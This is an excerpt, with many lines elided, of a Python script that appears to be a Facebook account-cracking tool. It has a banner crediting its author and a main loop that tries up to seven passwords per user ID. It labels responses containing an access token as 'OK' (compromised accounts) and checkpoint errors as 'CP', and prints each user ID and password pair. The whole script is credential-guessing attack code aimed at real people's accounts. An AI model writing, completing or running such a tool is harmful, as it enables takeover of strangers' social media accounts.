...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;93m➣ \033[1;92mWHATSAPP   :            053138217

     \033[1;96m➣ \033[1;92mGITHUB     :            MARKRAKIB404
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;31m [RAKIB-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;32m [RAKIB-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in q:
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;34m [RAKIB-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;35m [RAKIB-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;36m [RAKIB-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in q:
										...
										print(" \033[1;31m [RAKIB-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;32m [RAKIB-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;33m [RAKIB-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;34m [RAKIB-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;35m [RAKIB-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;36m [RAKIB-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																print(" \033[1;31m [RAKIB-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;32m [RAKIB-CP] "+uid+" | "+pass7+"\033[0;97m")
